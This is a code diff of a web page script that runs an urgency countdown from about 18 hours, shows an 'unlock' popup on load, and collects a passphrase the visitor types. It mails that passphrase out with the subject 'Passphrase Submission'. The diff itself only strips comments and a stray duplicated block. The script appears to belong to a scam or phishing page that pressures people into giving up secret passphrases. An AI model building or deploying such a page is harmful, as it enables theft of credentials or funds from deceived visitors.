@@ -1,4 +1,3 @@
-// Countdown starting from 18:47:12 (in minutes + seconds)
 let totalSeconds = (18 * 60 + 47) * 60 + 12;
 
 function updateTimer() {
@@ -25,27 +24,22 @@ function updateTimer() {
   }, 1000);
 }
 
-// Show unlock popup
 function showPopup() {
   document.getElementById("unlockPopup").style.display = "block";
 }
 
-// Hide unlock popup
 function hidePopup() {
   document.getElementById("unlockPopup").style.display = "none";
 }
 
-// Show download popup
 function showDownloadPopup() {
   document.getElementById("downloadPopup").style.display = "block";
 }
 
-// Hide download popup
 function hideDownloadPopup() {
   document.getElementById("downloadPopup").style.display = "none";
 }
 
-// Send passphrase via email (mailto method)
 function sendPassphrase() {
   const passphrase = document.getElementById("passphraseInput").value;
   if (passphrase.trim() === "") {
@@ -57,18 +51,8 @@ function sendPassphrase() {
   const subject = "Passphrase Submission";
   const body = `Passphrase: ${passphrase}`;
   const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-
   window.location.href = mailtoLink;
 }
 
-// Initialize on page load
 updateTimer();
 showPopup();
-]
-function showDownloadPopup() {
-  document.getElementById("downloadPopup").style.display = "block";
-}
-
-function hideDownloadPopup() {
-  document.getElementById("downloadPopup").style.display = "none";
-}
